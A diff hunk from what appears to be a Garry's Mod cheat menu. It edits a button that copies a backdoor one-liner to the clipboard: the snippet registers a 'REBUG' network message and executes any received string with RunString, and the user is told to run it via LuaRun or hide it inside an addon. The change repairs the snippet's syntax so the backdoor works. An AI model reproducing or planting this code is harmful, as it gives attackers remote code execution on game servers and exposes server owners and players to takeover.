@@ -2320,7 +2320,7 @@ end)
         copy.DoClick = function()
             surface.PlaySound("buttons/button18.wav")
             rprint(" Copied! LuaRun or place inside addon")
-            SetClipboardText('util.AddNetworkString("REBUG")net.Receive("REBUG"),function()RunString(net.ReadString())end)')
+            SetClipboardText('util.AddNetworkString("REBUG")net.Receive("REBUG",function()RunString(net.ReadString())end)')
         end
 
         local bhop = vgui.Create("DButton", VoidPlate)
